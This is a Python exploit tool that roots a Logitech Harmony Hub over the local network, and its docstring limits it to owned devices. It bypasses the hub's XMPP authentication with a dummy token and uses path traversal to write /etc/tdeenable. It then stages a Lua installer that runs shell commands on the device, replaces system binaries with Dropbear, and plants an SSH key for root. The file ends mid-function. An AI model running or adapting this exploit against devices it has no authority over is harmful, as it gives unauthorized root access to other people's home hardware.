#!/usr/bin/env python3
"""Root an owned Harmony Hub over LAN using the original XMPP local API path.

Flow:
  1. Prompt for the hub IP address when --host is not supplied.
  2. Authenticate to the hub's local XMPP service with the known local bypass.
  3. Write /etc/tdeenable through harmony.log?put path traversal.
  4. Use TDE-unlocked jsonfiletransfer to stage a Lua installer package.
  5. Trigger the installer, write MIPS Dropbear, start SSH, and open root shell.

Only Python standard library calls are used. Keep this for owned devices only.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import html
import json
import os
import pathlib
import re
import shutil
import socket
import struct
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Any
from xml.sax.saxutils import escape


SCRIPT_DIR = pathlib.Path(__file__).resolve().parent
DEFAULT_XMPP_PORT = 5222
DEFAULT_HBUS_PORT = 8088
DEFAULT_SSH_PORT = 22
DEFAULT_DOMAIN = "svcs.myharmony.com"
DEFAULT_CHUNK_SIZE = 1400
XMPP_AUTOMATION_CONFIG_URI = "dynamite://HomeAutomationService/Config/"
LUA_CHUNK_SIZE = 512
ELF_MACHINES = {8: "MIPS", 40: "ARM"}

STAGER_LUA = r'''
module(..., package.seeall)

local json = require("json")
local nativeBase64Ok, nativeBase64 = pcall(require, "base64")
local STAGE = __STAGE_JSON__
local RESULT = STAGE .. "/result.json"
local moduleObj

local function new(self)
  local obj = {}
  setmetatable(obj, self)
  self.__index = self
  return obj
end

function instance(self)
  if not moduleObj then
    moduleObj = new(self)
  end
  return moduleObj
end

local function shellQuote(s)
  return "'" .. string.gsub(s, "'", "'\\''") .. "'"
end

local function dirname(path)
  return string.match(path, "^(.*)/[^/]+$") or "/"
end

local function mkdirp(path)
  os.execute("mkdir -p " .. shellQuote(path))
end

local function readAll(path)
  local f, err = io.open(path, "rb")
  if not f then error("read failed " .. path .. ": " .. tostring(err)) end
  local data = f:read("*a") or ""
  f:close()
  return data
end

local function writeAll(path, data)
  mkdirp(dirname(path))
  local f, err = io.open(path, "wb")
  if not f then error("write failed " .. path .. ": " .. tostring(err)) end
  f:write(data or "")
  f:close()
end

local function b64decode(data)
  local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  data = string.gsub(data or "", "[^" .. alphabet .. "=]", "")
  if nativeBase64Ok and nativeBase64 and nativeBase64.decode then
    return nativeBase64.decode(data)
  end
  return (data:gsub(".", function(ch)
    if ch == "=" then return "" end
    local value = string.find(alphabet, ch, 1, true)
    if not value then return "" end
    value = value - 1
    local bits = ""
    for i = 6, 1, -1 do
      if value % (2 ^ i) - value % (2 ^ (i - 1)) > 0 then
        bits = bits .. "1"
      else
        bits = bits .. "0"
      end
    end
    return bits
  end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(bits)
    if #bits ~= 8 then return "" end
    local value = 0
    for i = 1, 8 do
      if string.sub(bits, i, i) == "1" then
        value = value + 2 ^ (8 - i)
      end
    end
    return string.char(value)
  end))
end

local function saveResult(ok, extra)
  local body = extra or {}
  body.ok = ok and true or false
  body.updatedAt = os.time()
  writeAll(RESULT, json.encode(body))
end

local function install()
  local manifest = json.decode(readAll(STAGE .. "/manifest.json"))
  local installed = {}

  for _, file in ipairs(manifest.files or {}) do
    local parts = {}
    for i = 1, tonumber(file.chunks or 0) do
      table.insert(parts, readAll(STAGE .. "/chunks/" .. file.id .. "." .. tostring(i)))
    end
    local data = b64decode(table.concat(parts, ""))
    if tonumber(file.bytes or 0) ~= #data then
      error("size mismatch for " .. file.path .. ": got " .. tostring(#data))
    end
    writeAll(file.path, data)
    if file.mode and string.match(file.mode, "^[0-7][0-7][0-7]$") then
      os.execute("chmod " .. file.mode .. " " .. shellQuote(file.path))
    end
    table.insert(installed, file.path)
  end

  for _, command in ipairs(manifest.commands or {}) do
    os.execute(command)
  end

  saveResult(true, {installed = installed})
end

function discover(self)
  local ok, err = pcall(install)
  if not ok then
    saveResult(false, {error = tostring(err)})
    return {}
  end
  return {["rootssh"] = {id = "rootssh", type = "rootssh", name = "Root SSH"}}
end
'''


@dataclass
class XmppResponse:
    raw: str
    code: str
    error: str
    payload: str


def recv_until(sock: socket.socket, needles: list[bytes], timeout: float = 10.0, limit: int = 2_000_000) -> str:
    end = time.time() + timeout
    chunks: list[bytes] = []
    data = b""
    while time.time() < end and len(data) < limit:
        try:
            chunk = sock.recv(16384)
        except socket.timeout:
            continue
        if not chunk:
            break
        chunks.append(chunk)
        data = b"".join(chunks)
        if any(needle in data for needle in needles):
            break
    return data.decode("utf-8", "replace")


def extract_attr(text: str, name: str) -> str:
    match = re.search(rf"{re.escape(name)}=['\"]([^'\"]*)['\"]", text)
    return html.unescape(match.group(1)) if match else ""


def extract_payload(text: str) -> str:
    cdata = re.search(r"<!\[CDATA\[(.*?)\]\]>", text, re.S)
    if cdata:
        return cdata.group(1)
    oa = re.search(r"<oa\b[^>]*>(.*?)</oa>", text, re.S)
    if oa:
        return html.unescape(oa.group(1))
    return ""


class XmppTransport:
    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self.sock: socket.socket | None = None
        self.counter = 0

    def __enter__(self) -> "XmppTransport":
        self.open()
        return self

    def __exit__(self, exc_type: object, exc: object, tb: object) -> None:
        self.close()

    def open(self) -> None:
        stream = (
            "<stream:stream to='connect.logitech.com' xmlns='jabber:client' "
            "xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
        )
        token = base64.b64encode(b"\x00harmony-root-tool\x00x").decode("ascii")
        sock = socket.create_connection((self.host, self.port), timeout=8)
        sock.settimeout(2)
        sock.sendall(stream.encode("utf-8"))
        recv_until(sock, [b"</stream:features>"], 4)
        auth = (
            "<auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl' "
            f"mechanism='PLAIN'>{token}</auth>"
        )
        sock.sendall(auth.encode("utf-8"))
        auth_response = recv_until(sock, [b"success", b"failure"], 5)
        if "<success" not in auth_response:
            raise RuntimeError("XMPP auth failed: " + auth_response[:500])
        sock.sendall(stream.encode("utf-8"))
        recv_until(sock, [b"</stream:features>"], 4)
        self.sock = sock

    def close(self) -> None:
        if self.sock:
            try:
                self.sock.close()
            finally:
                self.sock = None

    def call(self, cmd: str, body: object | str = "", timeout: int = 20) -> XmppResponse:
        if not self.sock:
            raise RuntimeError("XMPP session is not open")
        self.counter += 1
        cmd_id = f"xr-{self.counter}-{int(time.time() * 1000)}"
        if isinstance(body, str):
            encoded = body
        else:
            encoded = json.dumps(body, separators=(",", ":"))
        stanza = (
            f"<iq type='get' id='{cmd_id}' from='harmony-root-tool'>"
            f"<oa xmlns='connect.logitech.com' mime='{escape(cmd)}'>{escape(encoded)}</oa>"
            "</iq>"
        )
        self.sock.sendall(stanza.encode("utf-8"))
        raw = recv_until(
            self.sock,
            [f"id='{cmd_id}'".encode("ascii"), f'id="{cmd_id}"'.encode("ascii"), b"</iq>"],
            timeout=timeout,
        )
        return XmppResponse(
            raw=raw,
            code=extract_attr(raw, "errorcode"),
            error=extract_attr(raw, "errorstring"),
            payload=extract_payload(raw),
        )


class WebSocketTransport:
    def __init__(self, host: str, hub_id: str, port: int, domain: str) -> None:
        self.host = host
        self.hub_id = hub_id
        self.port = port
        self.domain = domain

    @staticmethod
    def _frame(payload: bytes) -> bytes:
        mask = os.urandom(4)
        length = len(payload)
        if length < 126:
            header = struct.pack("!BB", 0x81, 0x80 | length)
        elif length < 65536:
            header = struct.pack("!BBH", 0x81, 0x80 | 126, length)
        else:
            header = struct.pack("!BBQ", 0x81, 0x80 | 127, length)
        return header + mask + bytes(byte ^ mask[i % 4] for i, byte in enumerate(payload))

    @staticmethod
    def _recv_exact(sock: socket.socket, size: int) -> bytes:
        out = b""
        while len(out) < size:
            chunk = sock.recv(size - len(out))
            if not chunk:
                break
            out += chunk
        return out

    def _recv_ws(self, sock: socket.socket, timeout: float) -> str:
        sock.settimeout(timeout)
        head = self._recv_exact(sock, 2)
        if len(head) < 2:
            return ""
        first, second = head
        length = second & 0x7F
        if length == 126:
            length = struct.unpack("!H", self._recv_exact(sock, 2))[0]
        elif length == 127:
            length = struct.unpack("!Q", self._recv_exact(sock, 8))[0]
        payload = self._recv_exact(sock, length)
        if second & 0x80:
            mask, payload = payload[:4], payload[4:]
            payload = bytes(byte ^ mask[i % 4] for i, byte in enumerate(payload))
        if first & 0x0F == 8:
            return ""
        return payload.decode("utf-8", "replace")

    def call(self, cmd: str, params: Any, timeout: int = 20) -> dict[str, Any]:
        call_id = f"xroot-{int(time.time() * 1000)}"
        body = {"hubId": self.hub_id, "timeout": timeout, "hbus": {"id": call_id, "cmd": cmd, "params": params}}
        key = base64.b64encode(os.urandom(16)).decode("ascii")
        request = (
            f"GET /?domain={self.domain}&hubId={self.hub_id} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Version: 13\r\n\r\n"
        )
        with socket.create_connection((self.host, self.port), timeout=8) as sock:
            sock.sendall(request.encode("ascii"))
            headers = sock.recv(4096).decode("utf-8", "replace")
            if "101 Switching Protocols" not in headers:
                raise RuntimeError("websocket upgrade failed: " + headers[:500])
            sock.sendall(self._frame(json.dumps(body, separators=(",", ":")).encode("utf-8")))
            reply = self._recv_ws(sock, timeout + 8)
        if not reply:
            raise RuntimeError(f"empty WebSocket response for {cmd}")
        return json.loads(reply)


def response_code(obj: Any) -> str:
    if isinstance(obj, dict):
        if "code" in obj:
            return str(obj["code"])
        for value in obj.values():
            code = response_code(value)
            if code:
                return code
    if isinstance(obj, list):
        for value in obj:
            code = response_code(value)
            if code:
                return code
    return ""


def response_preview(obj: Any, limit: int = 500) -> str:
    return json.dumps(obj, separators=(",", ":"), ensure_ascii=True)[:limit]


def response_data(obj: Any) -> Any:
    if isinstance(obj, dict):
        if "data" in obj and any(key in obj for key in ("code", "errorcode", "errorCode", "cmd", "command")):
            return obj["data"]
        for value in obj.values():
            found = response_data(value)
            if found is not None:
                return found
    if isinstance(obj, list):
        for value in obj:
            found = response_data(value)
            if found is not None:
                return found
    return None


def parse_json_if_string(value: Any) -> Any:
    if not isinstance(value, str):
        return value
    try:
        return json.loads(value)
    except json.JSONDecodeError:
        return value


def extract_numeric_ids(text: str) -> list[str]:
    ids: list[str] = []
    for pattern in [
        r'"(?:activeRemoteId|remoteId|hubId)"\s*:\s*"?(\d{4,})"?',
        r'\b(?:activeRemoteId|remoteId|hubId)\s*[=:]\s*"?(\d{4,})"?',
        r'req:[^:]+:(\d{4,})',
        r'([0-9]{6,})Harmony\+Hub',
    ]:
        for match in re.finditer(pattern, text):
            value = match.group(1)
            if value not in ids:
                ids.append(value)
    return ids


def load_saved_hub_ids(host: str) -> list[str]:
    ids: list[str] = []

    def add(value: object) -> None:
        if value is None:
            return
        text = str(value).strip()
        if re.fullmatch(r"\d{4,}", text) and text not in ids:
            ids.append(text)

    candidates = [
        pathlib.Path.home() / ".harmony-hub" / "known_hubs.json",
        pathlib.Path.home() / ".harmony-hub" / "last_root.json",
        SCRIPT_DIR / "harmony_hub_id.json",
        SCRIPT_DIR / "harmony_hub_id.txt",
    ]
    for path in candidates:
        try:
            if not path.exists():
                continue
            if path.suffix == ".txt":
                add(path.read_text(encoding="utf-8").strip())
                continue
            data = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            continue
        if path.name == "known_hubs.json" and isinstance(data, dict):
            host_data = data.get(host)
            if isinstance(host_data, dict):
                add(host_data.get("hub_id"))
            continue
        if isinstance(data, dict):
            add(data.get("hub_id"))
    return ids


def discover_hub_ids_http(host: str, port: int) -> list[str]:
    probes = [
        {"id": 1, "cmd": "setup.account?getProvisionInfo", "timeout": 10000},
        {"id": 2, "cmd": "vnd.logitech.setup/vnd.logitech.account?getProvisionInfo", "timeout": 10000},
        {"id": 3, "cmd": "connect.sysinfo?get", "timeout": 10000},
    ]
    ids: list[str] = []
    for body in probes:
        request = urllib.request.Request(
            f"http://{host}:{port}/",
            data=json.dumps(body, separators=(",", ":")).encode("utf-8"),
            method="POST",
            headers={
                "Origin": "http://sl.dhg.myharmony.com",
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
        )
        try:
            with urllib.request.urlopen(request, timeout=8) as response:
                text = response.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            text = exc.read().decode("utf-8", "replace")
        except Exception:
            continue
        for value in extract_numeric_ids(text):
            if value not in ids:
                ids.append(value)
    return ids


def is_port_open(host: str, port: int, timeout: float = 3.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def automation_resource_from_response(response: dict[str, Any]) -> tuple[dict[str, Any] | None, dict[str, Any]]:
    data = parse_json_if_string(response_data(response))
    if not isinstance(data, dict):
        return None, {}
    resource = parse_json_if_string(data.get("resource"))
    if not isinstance(resource, dict):
        return None, data
    return resource, data


def automation_put_params(resource: dict[str, Any], data: dict[str, Any]) -> dict[str, Any]:
    params: dict[str, Any] = {"uri": XMPP_AUTOMATION_CONFIG_URI, "resource": resource}
    if data.get("hetag") is not None:
        params["hetag"] = data.get("hetag")
    elif data.get("heTag") is not None:
        params["hetag"] = data.get("heTag")
    return params


def enable_xmpp_with_websocket(
    host: str,
    hbus_port: int,
    domain: str,
    hub_ids: list[str],
    xmpp_port: int,
    wait_s: int,
) -> bool:
    if is_port_open(host, xmpp_port):
        print(f"xmpp_port_{xmpp_port}_open=true")
        return True
    if not hub_ids:
        print("xmpp_enable_candidates=none")
        print("Could not infer a hub ID for the 8088 WebSocket preflight. Re-run with --hub-id <id>.")
        return False

    print("xmpp_port_open_before_enable=false")
    print("xmpp_enable_candidates=" + ",".join(hub_ids))
    for hub_id in hub_ids:
        print(f"Trying to enable XMPP through WebSocket hub id {hub_id}...")
        try:
            ws = WebSocketTransport(host, hub_id, hbus_port, domain)
            get_resp = ws.call("proxy.resource?get", {"uri": XMPP_AUTOMATION_CONFIG_URI}, 30)
        except Exception as exc:  # noqa: BLE001
            print(f"proxy.resource?get failed for hub id {hub_id}: {exc}")
            continue

        get_code = response_code(get_resp)
        print(f"proxy.resource?get code={get_code or '?'} preview={response_preview(get_resp)}")
        if get_code and get_code != "200":
            continue

        resource, data = automation_resource_from_response(get_resp)
        if resource is None:
            print("Automation config response did not include a parseable resource; trying next hub id.")
            continue

        old_value = resource.get("enableXMPP")
        resource["enableXMPP"] = 1
        params = automation_put_params(resource, data)

        try:
            put_resp = ws.call("proxy.resource?put", params, 45)
        except Exception as exc:  # noqa: BLE001
            print(f"proxy.resource?put failed for hub id {hub_id}: {exc}")
            continue
        put_code = response_code(put_resp)
        print(
            "proxy.resource?put enableXMPP "
            f"{old_value!r}->1 code={put_code or '?'} preview={response_preview(put_resp)}"
        )
        if put_code == "412":
            latest_resource, latest_data = automation_resource_from_response(put_resp)
            if latest_resource is None:
                continue
            conflict_value = latest_resource.get("enableXMPP")
            latest_resource["enableXMPP"] = 1
            try:
                put_resp = ws.call("proxy.resource?put", automation_put_params(latest_resource, latest_data), 45)
            except Exception as exc:  # noqa: BLE001
                print(f"proxy.resource?put conflict retry failed for hub id {hub_id}: {exc}")
                continue
            put_code = response_code(put_resp)
            print(
                "proxy.resource?put conflict retry enableXMPP "
                f"{conflict_value!r}->1 code={put_code or '?'} preview={response_preview(put_resp)}"
            )
        if put_code and put_code not in ("200", "204"):
            continue

        print(f"Waiting up to {wait_s}s for XMPP on {host}:{xmpp_port}...")
        if wait_for_port(host, xmpp_port, wait_s):
            print("xmpp_port_open_after_enable=true")
            return True
        print("XMPP did not open inside the wait window for this hub id.")
    return False


def collect_xmpp_enable_hub_ids(host: str, hbus_port: int, cli_hub_ids: list[str] | None) -> list[str]:
    hub_ids: list[str] = []
    for value in cli_hub_ids or []:
        if value and value not in hub_ids:
            hub_ids.append(value)
    for value in load_saved_hub_ids(host):
        if value not in hub_ids:
            hub_ids.append(value)
    for value in discover_hub_ids_http(host, hbus_port):
        if value not in hub_ids:
            hub_ids.append(value)
    return hub_ids


def resolve_input_path(value: str) -> pathlib.Path:
    path = pathlib.Path(value).expanduser()
    if path.exists():
        return path
    relative = SCRIPT_DIR / value
    if relative.exists():
        return relative
    return path


def default_key_path() -> pathlib.Path:
    return pathlib.Path.home() / ".ssh" / "harmony_owner_ed25519"


def require_tool(name: str) -> str:
    path = shutil.which(name)
    if not path:
        raise SystemExit(f"{name} was not found in PATH. Install OpenSSH client tools and try again.")
    return path


def lock_down_private_key(private_key: pathlib.Path) -> None:
    if os.name != "posix":
        return
    try:
        private_key.chmod(0o600)
    except OSError as exc:
        raise SystemExit(f"failed to set 0600 permissions on {private_key}: {exc}") from exc


def ensure_keypair(private_key: pathlib.Path, public_key: pathlib.Path) -> None:
    ssh_keygen = require_tool("ssh-keygen")
    try:
        private_exists = private_key.exists()
        public_exists = public_key.exists()
    except OSError as exc:
        raise SystemExit(f"cannot access SSH key path {private_key}: {exc}") from exc
    if private_exists and public_exists:
        info(f"Using existing SSH public key: {public_key}")
        lock_down_private_key(private_key)
        return
    if private_exists and not public_exists:
        info(f"Private key exists but public key is missing; deriving {public_key}")
        public_key.write_text(
            subprocess.check_output([ssh_keygen, "-y", "-f", str(private_key)], text=True).strip() + "\n",
            encoding="utf-8",
        )
        lock_down_private_key(private_key)
        return
    if public_exists and not private_exists:
        raise SystemExit(f"public key exists but private key is missing: {private_key}")
    private_key.parent.mkdir(parents=True, exist_ok=True)
    info(f"No SSH key found; generating ed25519 keypair at {private_key}")
    subprocess.run(
        [ssh_keygen, "-q", "-t", "ed25519", "-f", str(private_key), "-N", "", "-C", "harmony-owner"],
        check=True,
    )
    lock_down_private_key(private_key)


def sha256_file(path: pathlib.Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def elf_machine(path: pathlib.Path) -> tuple[int, str] | None:
    header = path.read_bytes()[:20]
    if len(header) < 20 or header[:4] != b"\x7fELF":
        return None
    endian = "<" if header[5] == 1 else ">" if header[5] == 2 else ""
    if not endian:
        return None
    machine = struct.unpack(endian + "H", header[18:20])[0]
    return machine, ELF_MACHINES.get(machine, f"unknown-{machine}")


def validate_package_name(name: str) -> str:
    if not re.fullmatch(r"[A-Za-z][A-Za-z0-9_]{2,47}", name):
        raise SystemExit("package name must be 3-48 chars: letters, digits, underscore, starting with a letter")
    return name


def fresh_package_name() -> str:
    return "codexssh_" + format(int(time.time() * 1000), "x") + "_" + os.urandom(2).hex()


def cache_traversal_path(abs_path: str) -> str:
    return ".." + abs_path


def data_traversal_path(abs_path: str) -> str:
    return "../.." + abs_path


def build_stager_lua(stage_path: str) -> str:
    return STAGER_LUA.replace("__STAGE_JSON__", json.dumps(stage_path))


def build_loader_lua(stage_path: str) -> str:
    return f'''local n = ...
module(...,package.seeall)
local S={json.dumps(stage_path)}
local done=false
local function r(p)
  local f,e=io.open(p,"rb")
  if not f then error("read "..p..": "..tostring(e)) end
  local d=f:read("*a") or ""
  f:close()
  return d
end
local function L()
  if done then return package.loaded[n] end
  local t={{}}
  local c=tonumber(r(S.."/loader.count"))
  for i=1,c do t[#t+1]=r(S.."/loader."..tostring(i)) end
  local f,e=loadstring(table.concat(t,""))
  if not f then error(e) end
  f(n,package.seeall)
  done=true
  return package.loaded[n]
end
function instance(self)
  local m=L()
  return m.instance(m)
end
function discover(self)
  local m=L()
  return m.discover(m)
end
'''


def split_text(text: str, chunk_size: int) -> list[str]:
    return [text[index:index + chunk_size] for index in range(0, len(text), chunk_size)]


def build_payload(dropbearmulti: pathlib.Path, pubkey: pathlib.Path, chunk_size: int) -> tuple[dict[str, Any], dict[str, str]]:
    public_key = pubkey.read_text(encoding="utf-8").strip() + "\n"
    dbmulti = dropbearmulti.read_bytes()
    dropbear_wrapper = b'#!/bin/sh\nexec /data/rootssh/bin/dropbear -s -g -K 300 "$@"\n'
    dropbearkey_wrapper = b'#!/bin/sh\nexec /data/rootssh/bin/dropbearkey "$@"\n'
    files = [
        ("f1", "/data/rootssh/bin/dropbearmulti", "755", dbmulti),
        ("f2", "/usr/sbin/dropbear", "755", dropbear_wrapper),
        ("f3", "/usr/sbin/dropbearkey", "755", dropbearkey_wrapper),
        ("f4", "/home/root/.ssh/authorized_keys", "600", public_key.encode("utf-8")),
        ("f5", "/etc/tdeenable", "644", b"1\n"),
    ]
    manifest: dict[str, Any] = {
        "version": "rootssh-lan-xmpp",
        "files": [],
        "commands": [
            "mkdir -p /data/rootssh/bin /etc/dropbear /home/root/.ssh",
            "ln -sf dropbearmulti /data/rootssh/bin/dropbear",
            "ln -sf dropbearmulti /data/rootssh/bin/dropbearkey",
            "chmod 700 /home/root/.ssh",
            "chmod 600 /home/root/.ssh/authorized_keys",
            "[ -f /etc/dropbear/dropbear_rsa_host_key ] || /usr/sbin/dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key",
            "killall dropbear 2>/dev/null || true",
            "/usr/sbin/dropbear -R -E -p 22",
        ],
    }
    chunks: dict[str, str] = {}
    for ident, remote_path, mode, data in files:
        encoded = base64.b64encode(data).decode("ascii")
        parts = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
        for index, part in enumerate(parts, 1):
            chunks[f"{ident}.{index}"] = part
        manifest["files"].append({
            "id": ident,
            "path": remote_path,
            "mode": mode,
            "bytes": len(data),
            "sha256": hashlib.sha256(data).hexdigest(),
            "chunks": len(parts),
        })
    return manifest, chunks


def print_xmpp(label: str, resp: XmppResponse) -> None:
    print(f"{label}: code={resp.code or '?'} err={resp.error or '-'} payload_bytes={len(resp.payload.encode('utf-8'))}")


def step(title: str) -> None:
    print("")
    print("== " + title + " ==")


def info(message: str) -> None:
    print("  " + message)


def require_xmpp_ok(label: str, resp: XmppResponse) -> None:
    print_xmpp(label, resp)
    if resp.code != "200":
        raise SystemExit(f"{label} failed: code={resp.code or '?'} error={resp.error or '-'}")


def parse_json_maybe(text: str) -> Any:
    try:
        return json.loads(text)
    except Exception:
        return None


def jft_get_body(path: str, file_name: str) -> str:
    return f"path={path}&file={file_name}"


def jft_put_body(path: str, file_name: str, content: Any) -> str:
    if isinstance(content, str):
        body_content = json.dumps(content)
    else:
        body_content = json.dumps(content, separators=(",", ":"))
    return f"path={path}&file={file_name}&content={body_content}"


def json_get(xmpp: XmppTransport, path: str, file_name: str, label: str) -> XmppResponse:
    resp = xmpp.call("connect.jsonfiletransfer?get", jft_get_body(path, file_name), 30)
    require_xmpp_ok(label, resp)
    return resp


def json_put(xmpp: XmppTransport, path: str, file_name: str, content: Any, label: str) -> None:
    resp = xmpp.call("connect.jsonfiletransfer?put", jft_put_body(path, file_name, content), 30)
    require_xmpp_ok(label, resp)


def log_put(xmpp: XmppTransport, file_name: str, data: str, label: str, timeout: int = 30) -> None:
    resp = xmpp.call("harmony.log?put", {"resource": [{"fileName": file_name, "data": data}]}, timeout)
    require_xmpp_ok(label, resp)


def discover_hub_id(xmpp: XmppTransport) -> str:
    candidates: list[str] = []
    for path, file_name in [
        ("../../data/luaworks/provision", "preferences"),
        ("../../data/resources", "Context.json"),
        ("../../data/resources", "index.json"),
    ]:
        try:
            resp = xmpp.call("connect.jsonfiletransfer?get", jft_get_body(path, file_name), 20)
            if resp.code == "200":
                candidates.append(resp.payload)
        except Exception:
            pass
    blob = "\n".join(candidates)
    for pattern in [
        r'"remoteId"\s*:\s*"?(\d{4,})"?',
        r'"hubId"\s*:\s*"?(\d{4,})"?',
        r'req:[^:]+:(\d{4,})',
        r'([0-9]{6,})Harmony\+Hub',
    ]:
        match = re.search(pattern, blob)
        if match:
            return match.group(1)
    return ""


def tde_readback(xmpp: XmppTransport, label: str) -> tuple[bool, XmppResponse]:
    resp = xmpp.call("connect.jsonfiletransfer?get", jft_get_body("../../etc", "tdeenable"), 30)
    print_xmpp(label, resp)
    return resp.code == "200" and "1" in resp.payload, resp


def reopen_xmpp_after_app_restart(xmpp: XmppTransport, host: str, xmpp_port: int, label: str) -> None:
    print(f"{label}; waiting for XMPP service to return...")
    try:
        reboot = xmpp.call("setup.firmware?reboot", {}, 10)
        print_xmpp("setup.firmware?reboot", reboot)
    except Exception as exc:  # noqa: BLE001
        print(f"setup.firmware?reboot request did not complete: {exc}")
    xmpp.close()
    time.sleep(5)
    if not wait_for_port(host, xmpp_port, 150):
        raise SystemExit("XMPP service did not come back after app restart request")
    xmpp.open()


def websocket_log_put(
    host: str,
    hbus_port: int,
    domain: str,
    hub_ids: list[str],
    file_name: str,
    data: str,
    label: str,
    timeout: int = 20,
    quiet: bool = False,
) -> bool:
    for hub_id in hub_ids:
        for attempt in range(1, 4):
            if not quiet:
                print(f"{label}: trying WebSocket harmony.log?put with hub id {hub_id} (attempt {attempt}/3)...")
            try:
                ws = WebSocketTransport(host, hub_id, hbus_port, domain)
                resp = ws.call("harmony.log?put", {"resource": [{"fileName": file_name, "data": data}]}, timeout)
            except Exception as exc:  # noqa: BLE001
                print(f"{label}: websocket log_put failed for hub id {hub_id}: {exc}")
                break
            code = response_code(resp)
            if not quiet or code not in ("", "200"):
                print(f"{label}: websocket log_put code={code or '?'} preview={response_preview(resp)}")
            if not code or code == "200":
                return True
            if code not in ("202", "203"):
                break
            time.sleep(5)
    return False


def websocket_json_put(
    host: str,
    hbus_port: int,
    domain: str,
    hub_ids: list[str],
    path: str,
    file_name: str,
    content: Any,
    label: str,
    timeout: int = 20,
) -> bool:
    for hub_id in hub_ids:
        for attempt in range(1, 4):
            print(f"{label}: trying WebSocket jsonfiletransfer?put with hub id {hub_id} (attempt {attempt}/3)...")
            try:
                ws = WebSocketTransport(host, hub_id, hbus_port, domain)
                resp = ws.call(
                    "connect.jsonfiletransfer?put",
                    {"path": path, "file": file_name, "content": content},
                    timeout,
                )
            except Exception as exc:  # noqa: BLE001
                print(f"{label}: websocket json_put failed for hub id {hub_id}: {exc}")
                break
            code = response_code(resp)
            print(f"{label}: websocket json_put code={code or '?'} preview={response_preview(resp)}")
            if not code or code == "200":
                return True
            if code not in ("202", "203"):
                break
            time.sleep(5)
    return False


def try_websocket_tde_write(host: str, hbus_port: int, domain: str, hub_ids: list[str]) -> bool:
    return websocket_log_put(host, hbus_port, domain, hub_ids, "../etc/tdeenable", "1\n", "write /etc/tdeenable")


def collect_hub_ids(host: str, hbus_port: int, xmpp: XmppTransport, sysinfo_payload: str) -> list[str]:
    hub_ids = extract_numeric_ids(sysinfo_payload)
    for value in discover_hub_ids_http(host, hbus_port):
        if value not in hub_ids:
            hub_ids.append(value)
    hub_id = discover_hub_id(xmpp)
    if hub_id and hub_id not in hub_ids:
        hub_ids.append(hub_id)
    return hub_ids


def save_hub_id_handoff(host: str, hub_id: str, candidates: list[str]) -> list[pathlib.Path]:
    if not hub_id:
        return []

    saved_at = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    metadata = {
        "host": host,
        "hub_id": hub_id,
        "candidates": candidates,
        "saved_at": saved_at,
        "source": "harmony-hub-root",
    }
    written: list[pathlib.Path] = []

    def write_text(path: pathlib.Path, text: str) -> None:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        written.append(path)

    config_dir = pathlib.Path.home() / ".harmony-hub"
    try:
        write_text(config_dir / "hub_id.txt", hub_id + "\n")
        write_text(config_dir / "last_root.json", json.dumps(metadata, indent=2, sort_keys=True) + "\n")

        known_path = config_dir / "known_hubs.json"
        try:
            known = json.loads(known_path.read_text(encoding="utf-8")) if known_path.exists() else {}
            if not isinstance(known, dict):
                known = {}
        except Exception:
            known = {}
        known[host] = metadata
        write_text(known_path, json.dumps(known, indent=2, sort_keys=True) + "\n")
    except OSError as exc:
        print(f"WARNING: could not write per-user Hub ID handoff files: {exc}")

    for name, text in [
        ("harmony_hub_id.txt", hub_id + "\n"),
        ("harmony_hub_id.json", json.dumps(metadata, indent=2, sort_keys=True) + "\n"),
    ]:
        try:
            path = SCRIPT_DIR / name
            path.write_text(text, encoding="utf-8")
            written.append(path)
        except OSError as exc:
            print(f"WARNING: could not write {SCRIPT_DIR / name}: {exc}")

    return written


def refresh_xmpp_session(xmpp: XmppTransport, host: str, xmpp_port: int, label: str) -> None:
    print(label)
    xmpp.close()
    if not wait_for_port(host, xmpp_port, 60):
        raise SystemExit("XMPP service is not reachable for session refresh")
    xmpp.open()


def open_tde_gate(
    xmpp: XmppTransport,
    host: str,
    xmpp_port: int,
    hbus_port: int,
    domain: str,
    sysinfo_payload: str,
) -> None:
    step("Opening TDE Gate")
    info("Writing /etc/tdeenable through the local XMPP log-write path.")
    info("That marker unlocks the hub's development file-transfer API for the rest of the install.")
    print("Opening TDE gate with harmony.log?put traversal...")
    log_put(xmpp, "../etc/tdeenable", "1\n", "write /etc/tdeenable")
    time.sleep(1)
    ok, resp = tde_readback(xmpp, "verify /etc/tdeenable")
    if ok:
        info("TDE gate is open.")
        return

    if resp.code == "594":
        info("The marker write was accepted, but this app process still says production mode; requesting an app-layer restart.")
        reopen_xmpp_after_app_restart(
            xmpp,
            host,
            xmpp_port,
            "TDE marker write was accepted, but this app instance still reports production mode",
        )
        ok, resp = tde_readback(xmpp, "verify /etc/tdeenable after app restart")
        if ok:
            info("TDE gate opened after app-layer restart.")
            return

    hub_ids = collect_hub_ids(host, hbus_port, xmpp, sysinfo_payload)

    if resp.code == "594" and hub_ids and try_websocket_tde_write(host, hbus_port, domain, hub_ids):
        info("Retrying the marker write through WebSocket because this firmware parses that path more reliably.")
        time.sleep(1)
        ok, resp = tde_readback(xmpp, "verify /etc/tdeenable after WebSocket write")
        if ok:
